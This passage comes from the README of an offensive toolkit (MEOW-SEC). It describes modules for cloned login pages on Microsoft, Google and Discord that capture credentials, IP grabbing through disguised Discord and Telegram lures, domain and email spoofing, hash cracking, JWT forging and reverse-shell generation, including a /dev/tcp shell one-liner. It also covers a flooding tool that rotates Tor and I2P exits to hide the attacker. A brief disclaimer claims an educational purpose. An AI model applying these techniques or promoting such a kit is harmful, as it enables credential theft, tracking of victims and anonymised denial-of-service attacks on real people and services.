#### `[34]` 2FA — 2FA Bypass Tester
**Ce qu'il fait** : Teste plusieurs techniques de bypass de la double authentification : brute force OTP (codes 000000 à 999999 sur les implémentations sans rate limit), réutilisation d'un code précédemment valide, manipulation de la réponse (intercept et modification du JSON), codes de backup communs, et tentative de skip de l'étape 2FA.

**Quand l'utiliser** : Après avoir obtenu des credentials valides. Le 2FA est souvent l'unique barrière restante et de nombreuses implémentations maison sont vulnérables au brute force ou à la manipulation de réponse.

---

#### `[51]` WPSCAN — WordPress Vulnerability Scanner
**Ce qu'il fait** : Scanner complet pour WordPress. Détecte la version exacte (readme.html, meta generator, assets `?ver=`), mappe les CVEs connus (base intégrée WP 4.x → 6.4+), énumère les plugins installés (20 plugins vulnérables dans la base), les thèmes (5 thèmes vulnérables), énumère les utilisateurs (REST API + redirect `?author=`), teste XML-RPC, et vérifie 25 chemins de fichiers sensibles.

**Quand l'utiliser** : Sur toute cible WordPress — c'est le CMS le plus répandu et le plus attaqué. Un plugin vulnérable suffit pour compromettre tout le site. WPSCAN est souvent la première chose à lancer après avoir détecté WordPress avec CMS.

**Retourne** : Version, CVEs associés, plugins/thèmes vulnérables, utilisateurs, fichiers exposés.

---

#### `[52]` FRONTSCAN — React / TypeScript / TSX Scanner
**Ce qu'il fait** : **Mode statique** : analyse les fichiers `.ts/.tsx/.js/.jsx` locaux avec 40+ patterns — XSS (`dangerouslySetInnerHTML`), injections TypeORM (QueryBuilder, `orderBy(userInput)`, `dataSource.query(\`${}\`)`), secrets hardcodés (clés AWS/Stripe/GitHub), stockage sensible dans localStorage, open redirect, prototype pollution, CORS wildcard. **Mode remote** : scanne une app déployée — source maps exposées (`.js.map`), extraction de secrets dans les bundles JS, GraphQL introspection, `window.__INITIAL_STATE__`.

**Quand l'utiliser** : Mode statique lors d'une code review sur un projet React/TypeScript (bug bounty, audit interne). Mode remote sur des apps en production pour chercher des fuites de code ou de secrets.

---

### 🎭 PHISHING & RED TEAM

Les outils red team simulent des attaques d'ingénierie sociale — phishing d'identifiants, usurpation d'URL, spoofing d'email, collecte d'IP. Réservés aux simulations autorisées et aux tests de sensibilisation.

---

#### `[24]` PHISH — Phishing Page + Tunnel
**Ce qu'il fait** : Démarre un serveur HTTP local avec un template de phishing pixel-perfect (Microsoft 365, Google, LinkedIn, Discord, Steam, Instagram, Generic), puis crée automatiquement un tunnel public via cloudflared (auto-téléchargé), serveo, localhost.run, ou bore. Capture les credentials soumis en live dans `data/phish_*.log` et redirige immédiatement vers le vrai site pour ne pas éveiller les soupçons.

**Quand l'utiliser** : Dans les simulations de phishing autorisées pour mesurer le taux de clics et de soumission de credentials d'une organisation. Nécessite un domaine crédible (utiliser URLSPOOF pour générer un lookalike) et une confirmation écrite d'autorisation.

---

#### `[46]` TRACK — Chameleon IP Grabber
**Ce qu'il fait** : Génère une URL avec un token unique. Quand la victime ouvre le lien, son IP est loggée + géolocalisée en temps réel. Supporte 7 thèmes de leurre : preview image (photo, colis, document, alerte) pour Discord/Telegram, et og:video (Discord affiche un embed vidéo ▶ Play). Envoie aussi un pixel invisible pour les emails.

**Quand l'utiliser** : En reconnaissance passive pour identifier l'IP réelle d'une cible (utile si la cible utilise un VPN), ou dans des simulations de phishing pour tracker les clics sans servir de faux login.

---

#### `[58]` URLSPOOF — URL Spoofing & Lookalike Domains
**Ce qu'il fait** : Génère toutes les variantes d'attaque sur un domaine cible : **IDN homograph** (substitution Cyrillique/Grec invisible — `pаypal.com` avec un `а` Cyrillique), **typosquatting** (lettre manquante, doublée, adjacent clavier, transposée), **tricks de sous-domaine** (`paypal.login-secure.com`), **TLD swap** (`.co`, `.io`...), **@ trick RFC3986** (`https://paypal.com@evil.com` — le browser va sur evil.com), **data: URI** (aucun domaine, bypass les scanners), **open redirect chain**, **bit-squatting**. Vérifie automatiquement quels domaines sont encore libres à l'enregistrement.

**Quand l'utiliser** : Pour préparer une campagne de phishing convaincante (red team), ou pour un audit défensif — savoir quels lookalikes existent déjà pour son propre domaine et les surveiller.

---

#### `[59]` MAILSPOOF — Email Spoofing
**Ce qu'il fait** : Vérifie si un domaine est spoofable (SPF `~all`/`+all`/absent + DMARC `p=none`/absent), génère 8 variantes de spoofing (display name, reply-to hijack, subaddressing, Unicode dans le display name, lookalike domain, IDN), teste si le serveur MX est un open relay (port 25 sans auth), et peut envoyer un vrai email de test via SMTP avec From forgé.

**Quand l'utiliser** : Pour tester la sensibilité d'une organisation aux emails spoofés. En audit défensif, pour vérifier que son propre domaine ne peut pas être utilisé pour du spoofing. L'envoi SMTP est réservé aux simulations avec autorisation.

---

#### `[57]` EMAILSEC — Email Security Checker
**Ce qu'il fait** : Analyse complète de la posture email d'un domaine — SPF (politique `all`, nombre de lookups DNS), DKIM (20+ sélecteurs testés automatiquement, taille de clé, mode test), DMARC (politique `p=`, sous-domaines `sp=`, pourcentage `pct=`, reporting `rua=`), MX, BIMI. Calcule un **score de spoofabilité 0–10** avec verdict clair.

**Quand l'utiliser** : Avant de lancer MAILSPOOF pour savoir si le domaine cible est effectivement spoofable. Aussi en audit défensif pour valider la configuration email de son propre domaine. Utilise DNS-over-HTTPS Cloudflare — aucune dépendance externe.

| Score | Verdict |
|-------|---------|
| 7–10 | HIGHLY SPOOFABLE — le domaine peut être usurpé facilement |
| 4–6 | MODERATELY SPOOFABLE — protection partielle |
| 1–3 | PARTIALLY PROTECTED — la plupart des emails légitimes passent |
| 0 | WELL PROTECTED — SPF `-all` + DKIM + DMARC `p=reject` |

---

### 🛠️ UTILS — Outils transversaux

Les utilitaires sont utilisés dans toutes les phases — ils génèrent des payloads, décodent des données, cracke des hashes, génèrent des shells, et organisent les résultats.

---

#### `[11]` PAWS — Password Generator
**Ce qu'il fait** : Génère des mots de passe selon différentes stratégies — patterns (lettres+chiffres+symboles), wordlists contextualisées (nom d'entreprise + année + symbole), PIN numériques, et phrases de passe.

**Quand l'utiliser** : Pour générer des wordlists ciblées avant un brute force ou un spray. Une wordlist avec le nom de l'entreprise, l'année et quelques variations (`Company2024!`, `company123`, `COMPANY2024`) est souvent plus efficace qu'une liste générique rockyou.

---

#### `[12]` MEWHASH — Hash Tools
**Ce qu'il fait** : Identifie le type d'un hash, tente de le cracker hors ligne avec une wordlist, applique des règles de mutation (l33t speak, majuscules, suffixes...) pour des variantes, et fait un lookup dans des bases de hashes en ligne.

**Quand l'utiliser** : Après extraction de hashes depuis une DB SQL, un `/etc/shadow`, des configs exposées, ou des réponses d'API. Le mode règles génère `password` → `p@ssw0rd`, `P4ssword!`, etc. sans nécessiter une liste de 100 millions d'entrées.

---

#### `[13]` CODEC — Encoder / Decoder
**Ce qu'il fait** : Encode et décode en Base64/32/16, URL encoding, HTML entities, ROT13, hex, XOR, et combinaisons (double-encoding). Utile pour décoder des payloads obscurcis, préparer des payloads encodés pour bypasser des filtres, ou analyser des tokens.

**Quand l'utiliser** : Constamment. Les WAF bloquent `<script>` mais pas `%3Cscript%3E` ou `\x3cscript\x3e`. Les double-encodings (`%2527` → `%27` → `'`) bypass souvent les filtres d'une seule passe.

---

#### `[14]` PAYLOAD — Payload Library
**Ce qu'il fait** : Bibliothèque de payloads classés par catégorie — XSS (reflected, DOM, bypass encodage), SQLi (error, blind, time, UNION), path traversal, LFI wrappers PHP, SSTI par engine, SSRF, CRLF, open redirect.

**Quand l'utiliser** : Pour trouver rapidement un payload adapté sans quitter le terminal. Organisé pour les CTF où on cherche le bon payload pour un contexte précis.

---

#### `[17]` REVSHELL — Reverse Shell Generator
**Ce qu'il fait** : Génère des reverse shells prêts à coller dans 21 langages/outils (bash_tcp, python3, php_exec, nc_mkfifo, powershell, socat, golang, java, perl, ruby, node, awk, lua...) avec IP et port configurables. Propose aussi les commandes de listener correspondantes.

**Quand l'utiliser** : Après avoir confirmé un RCE (via CMDI, UPLOAD, SSTI...) pour obtenir un shell interactif. Les shells basiques `/bin/bash -i >& /dev/tcp/IP/PORT 0>&1` sont souvent bloqués — le module propose plusieurs alternatives encodées.

---

#### `[19]` JWTCAT — JWT Attacker
**Ce qu'il fait** : Attaque les JSON Web Tokens selon 4 méthodes : **alg:none** (supprime la signature — 5 variations de casse), **RS256→HS256** (signe avec la clé publique RSA comme secret HMAC — confusion algorithmique), **HMAC brute force** (wordlist custom ou 35 secrets communs), **forge** (édition libre du payload + resign).

**Quand l'utiliser** : Dès qu'une app utilise des JWT pour l'authentification. L'attaque alg:none fonctionne sur de vieilles librairies. La confusion RS256→HS256 fonctionne quand la clé publique est accessible (endpoint JWKS). Le brute force cible les secrets courts ou prévisibles (`secret`, `password`, nom du projet).

---

#### `[7]` LOOT — Saved Results Viewer
**Ce qu'il fait** : Browseur de fichiers JSON dans `data/` — liste tous les résultats sauvegardés par les modules avec date, cible, et aperçu, et permet de les consulter en détail dans le terminal.

**Quand l'utiliser** : Pour revoir les résultats d'une session précédente ou préparer les éléments d'un rapport sans rouvrir des fichiers JSON bruts.

---

#### `[20]` REPORT — HTML Report Generator
**Ce qu'il fait** : Agrège tous les fichiers JSON de `data/` et génère un rapport HTML standalone avec timeline, sections par catégorie (Ports, Web Recon, DNS, WAF, OSINT, Injections, CVE, Takeover, Buckets), sections collapsibles, et un theme dark matrix. Aucune dépendance externe — s'ouvre dans n'importe quel navigateur.

**Quand l'utiliser** : En fin de mission pour livrer un rapport lisible au client ou constituer une preuve pour un bug bounty. Tous les modules sauvegardent automatiquement leurs résultats en JSON dans `data/` — REPORT les consolide en un seul document.

---

## 🔄 Proxy Rotation

Tous les modules HTTP utilisent la rotation automatique :

```
python meow.py proxycat   → télécharge 35+ sources, valide en parallèle
                          → conserve top 30% (vitesse)
                          → sauvegarde dans data/proxies.json
                          → chaque module fait proxies=px() automatiquement
```

| Type | Format | Usage |
|------|--------|-------|
| HTTP | `ip:port` | Défaut, tous les modules |
| SOCKS4 | `socks4://ip:port` | Méthodes raw socket (SMUGGLE, TLS flood) |
| SOCKS5 | `socks5://ip:port` | Recommandé pour l'anonymat |

Si aucun proxy n'est disponible : connexion directe automatique, aucun crash.

---

## 🌐 Tunnels publics

Partagés par PHISH et TRACK — le même gestionnaire `core/tunnel.py` :

| Service | Install | Notes |
|---------|---------|-------|
| **cloudflared** | Auto-dl au premier usage (~20 MB) | HTTPS, le plus fiable, URL vérifiée avant affichage |
| **serveo.net** | SSH (aucun install) | Gratuit, parfois down |
| **localhost.run** | SSH (aucun install) | Stable |
| **bore.pub** | `cargo install bore-cli` | Nécessite Rust |
| **LAN only** | — | Sans tunnel, IP locale uniquement |

---

## 💥 STRESS — Détail des 26 méthodes

| Catégorie | Méthode | Description |
|-----------|---------|-------------|
| L7 Standard | HTTP_GET / POST / HEAD | Flood basique avec User-Agent rotation + proxy |
| L7 Evasion | HTTP_BYPASS | Headers X-Forwarded-For aléatoires + Pragma + referrer spoofé |
| L7 App | HTTP_JSON | POST flood sur REST APIs avec JSON body aléatoire |
| L7 App | HTTP_XMLRPC | WordPress xmlrpc.php multicall — 100 auth par requête |
| L7 Slow | SLOWLORIS | Connexions HTTP incomplètes — épuise le pool de connexions |
| L7 Slow | RUDY | R-U-Dead-Yet — POST avec body de 1 octet/tick |
| L7 TLS | TLS | Flood de TLS handshakes — CPU-intensif côté serveur |
| L7 Sync | **PULSAR** | `threading.Barrier` — N threads tirent à la même milliseconde |
| L7 Adapt | RESONANCE | Loi de Little — calcule l'intervalle optimal pour 100% de charge |
| HTTP/2 | H2_CONTINUATION | ★★★★★ CVE-2024-27316 — HEADERS sans END_HEADERS → OOM |
| HTTP/2 | H2_RST | ★★★★ CVE-2023-44487 — RST Storm rapid reset |
| WebSocket | WS_FLOOD | ★★★★ PING flood — PONG obligatoire RFC 6455 |
| L4 | TCP / UDP | Connect flood / datagram flood |
| L3 | ICMP | Echo flood |
| Anon | **SPECTER** | Tor auto-install + circuit renewal — exit IP changeante |
| Anon | **WRAITH** | I2P auto-install — garlic routing |
| Anon | **PHANTOM_MIX** | Tor + I2P alternés — double pool d'exit IPs |
| Multi | **SWARM** | ★★★★★ 5 méthodes simultanées (BYPASS 30% + PULSAR 25% + COOKIE 20% + SLOW 15% + TLS 10%) |

---

## 🎣 PHISH — Templates disponibles

| # | Template | Fidélité |
|---|----------|----------|
| 1 | **Microsoft 365** | Logo SVG 4 carrés, Segoe UI, card blanche exacte |
| 2 | **Google** | Logo SVG coloré, Roboto, floating labels animés |
| 3 | **LinkedIn** | Navbar complète, SVG, hero texte bordeaux |
| 4 | **Discord** | Split-panel dark `#2b2d31`, blurple `#5865f2`, logo SVG |
| 5 | **Steam** | Navbar dark blue, panel vert gradient, bouton SIGN IN |
| 6 | **Instagram** | Logo SVG, "Log in with Facebook", App Store buttons |
| 7 | **Generic** | Terminal hacker — scanlines CSS, ASCII art, animations |
| + | **Custom HTML** | Charge n'importe quel fichier `.html` externe |

---

## 🕵️ TRACK — Thèmes de leurre

| Thème | Type | Comportement Discord/Telegram |
|-------|------|-------------------------------|
| Photo partagée | Image OGP | Preview card — IP loggée au clic |
| Suivi de colis | Image OGP | Preview card — IP loggée au clic |
| Document partagé | Image OGP | Preview card — IP loggée au clic |
| Alerte sécurité | Image OGP | Preview card — IP loggée au clic |
| Vidéo exclusive 🔥 | og:video | Embed ▶ Play natif Discord — IP sur lecture |
| Clip inédit | og:video | Embed ▶ Play natif Discord — IP sur lecture |
| Fail du jour 😂 | og:video | Embed ▶ Play natif Discord — IP sur lecture |

---

## 📈 Changelog

| Version | Modules | Ajouts principaux |
|---------|---------|-------------------|
| **v1.5** | 61 | URLSPOOF · MAILSPOOF · IPLOOKUP · PHONELOOKUP |
| **v1.4** | 57 | IDOR · UPLOAD · RACE · LDAPI · EMAILSEC |
| **v1.3** | 52 | SQLI · CMDI · NOSQLI · ORMI · WPSCAN · FRONTSCAN |
| **v1.2** | 46 | SMUGGLE · XXE · GITDUMP · SSTI · SECRETSCAN · CACHE · OAUTH · DESERIA · PROTO · BREACH · SHODAN · TRACK |
| **v1.1** | 34 | CORS · LFI · FUZZ · CVE · HARVEST · TAKEOVER · BUCKET · SPRAY · GRAPHQL · 2FA |
| **v1.0** | 24 | Modules core : CLAW · PURR · SCRATCH · WHISKER · HISS · CATNAP · GHOST · OSINT+ · PROXYCAT · PAWS · MEWHASH · CODEC · PAYLOAD · NETKIT · STRESS · LOOT · REVSHELL · WAF · JWTCAT · REPORT · BRUTE · CMS · SSLSCAN · PHISH |

---

## Disclaimer

> **Ce projet est strictement éducatif.** Utilisation réservée aux CTF, red team autorisé et recherche en sécurité. L'utilisation de cet outil sur des systèmes sans autorisation explicite est illégale dans la plupart des juridictions. Les auteurs ne sont pas responsables de toute utilisation abusive. **Respectez la loi. Stay legal.**

---

## Credits

**by cat-project-hat** *(we do the best for you)*

---

```
   /\_/\
  ( o.o )   MEOW-SEC v1.5 // BY CAT-PROJECT-HAT // 2026
   > ^ <    61 modules · Python 3 · Rich TUI
  /|   |\   Stay in the shadows. Stay curious.
 (_|   |_)
```
